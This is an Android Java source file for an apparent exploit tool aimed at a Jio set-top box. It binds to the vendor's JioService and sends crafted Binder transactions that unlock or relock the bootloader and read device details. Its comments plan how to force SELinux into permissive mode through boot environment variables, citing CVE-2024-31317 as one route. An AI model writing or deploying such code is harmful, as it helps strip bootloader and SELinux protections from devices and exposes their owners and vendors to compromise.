package com.test.bootenv;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;

public class MainActivity extends Activity {
    static final String TAG = "BootEnv";
    static final String DESCRIPTOR = "com.jio.stb.jioservicelibrary.IJioServiceAidlInterface";
    static final int TRANSACTION_performOpertion = 1;
    TextView tv;
    IBinder serviceBinder;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        ScrollView sv = new ScrollView(this);
        tv = new TextView(this);
        tv.setPadding(16,16,16,16);
        tv.setTextSize(11);
        sv.addView(tv);
        setContentView(sv);

        String action = getIntent().getStringExtra("action");
        if (action == null) action = "info";
        log("BootEnv action=" + action);
        bindJioService(action);
    }

    void log(String msg) {
        Log.d(TAG, msg);
        if (tv != null) tv.append(msg + "\n");
    }

    void bindJioService(final String action) {
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
            "com.jio.stb.jioservice", "com.jio.stb.jioservice.JioService"));
        bindService(intent, new ServiceConnection() {
            public void onServiceConnected(ComponentName n, IBinder b) {
                log("Connected to JioService");
                serviceBinder = b;
                run(action);
            }
            public void onServiceDisconnected(ComponentName n) { serviceBinder = null; }
        }, Context.BIND_AUTO_CREATE);
    }

    void run(String action) {
        switch (action) {
            case "selinux_permissive":
                doSetEnv("EnableSelinux", "permissive");
                break;
            case "selinux_enforcing":
                doSetEnv("EnableSelinux", "enforcing");
                break;
            case "unlock":
                doBootloader(false);
                break;
            case "lock":
                doBootloader(true);
                break;
            case "setenv":
                String k = getIntent().getStringExtra("key");
                String v = getIntent().getStringExtra("value");
                if (k != null && v != null) doSetEnv(k, v);
                else log("ERROR: need --es key <k> --es value <v>");
                break;
            default:
                doInfo();
                break;
        }
    }

    void doSetEnv(String key, String value) {
        log("=== SET BOOTENV: " + key + " = " + value + " ===");
        // JioService doesn't expose a generic setBootEnv AIDL.
        // The setBootEnv call is internal to JioServiceExtendedAML.
        // We need to use a different approach:
        // JioServiceExtendedAML has setVendorProperty which calls ISystemControl.setProperty
        // But that's also not directly accessible.
        // 
        // Actually — setBootEnv IS called for bootloader lock. But there's no generic env set API.
        // Let's try the setBootEnv path: the bootloader AIDL calls setBootEnv internally.
        // We can't inject arbitrary keys through that.
        //
        // Alternative: there ARE other AIDL commands that call setBootEnv for specific vars.
        // For example, HDR/resolution changes write ubootenv vars.
        // But for arbitrary vars like EnableSelinux, we need a different approach.
        //
        // The REAL solution: use the setProperty HIDL method which can set ubootenv.var.* 
        // properties. But we need ISystemControl access for that.
        //
        // OR: some JioService APIs might write to arbitrary env vars.
        // Let me check if set_hdr or set_resolution internally writes the var we want.
        
        log("Attempting via JioService AIDL...");
        // Unfortunately, JioService only writes specific hardcoded env vars
        // through specific API calls. No generic env write is exposed.
        // The bootloader lock_state was special because it had its own API.
        
        // Let me try a creative workaround: can we abuse the HDMI resolution setting
        // which calls setBootEnv for ubootenv.var.outputmode etc.?
        // No - those write specific keys only.
        
        log("JioService AIDL has no generic setBootEnv command.");
        log("Only specific commands (bootloader lock, HDR, resolution) write specific env vars.");
        log("For EnableSelinux, we need direct ISystemControl access (system_app context).");
        log("");
        log("Options:");
        log("1. CVE-2024-31317 with bootenv.jar (system_app can call HIDL)");
        log("2. If bootloader IS unlocked: fastboot flash env partition");
    }

    void doBootloader(boolean lock) {
        log("=== BOOTLOADER " + (lock ? "LOCK" : "UNLOCK") + " ===");
        String json = "{\"module\":\"bootloader\",\"api\":\"set_bootloader_lock_params\"," +
            "\"transaction_id\":\"100\",\"args\":{\"lock\":" + lock + "}}";
        log("Sending: " + json);
        String r = callAidl(json);
        log("Response: " + r);
    }

    void doInfo() {
        log("=== DEVICE INFO ===");
        String[][] queries = {
            {"boot_reason", "get_boot_reason"},
            {"HDMI", "get_current_resolution_details"},
            {"HDMI", "get_default_hdr"},
            {"HDMI", "get_cec_status"},
            {"HDMI", "get_supported_resolutions"},
            {"HDMI", "get_hdcp_auth_status"},
            {"HDMI", "get_hdcp_version"},
            {"HDMI", "get_hdmi_raw_edid"},
            {"NTP", "get_ntp_server_details"},
            {"NTP", "get_ntp_server_list"},
            {"audio_format", "get_supported_audio_format"},
            {"test", "get_ram_used_by_process"},
        };
        for (String[] q : queries) {
            String json = "{\"module\":\"" + q[0] + "\",\"api\":\"" + q[1] + 
                "\",\"transaction_id\":\"100\",\"args\":{}}";
            String r = callAidl(json);
            log(q[1] + ": " + r);
        }
    }

    String callAidl(String json) {
        if (serviceBinder == null) return "ERROR: not connected";
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(DESCRIPTOR);
            data.writeString(json);
            boolean ok = serviceBinder.transact(TRANSACTION_performOpertion, data, reply, 0);
            if (!ok) return "ERROR: transact failed";
            reply.readException();
            return reply.readString();
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        } finally { reply.recycle(); data.recycle(); }
    }
}
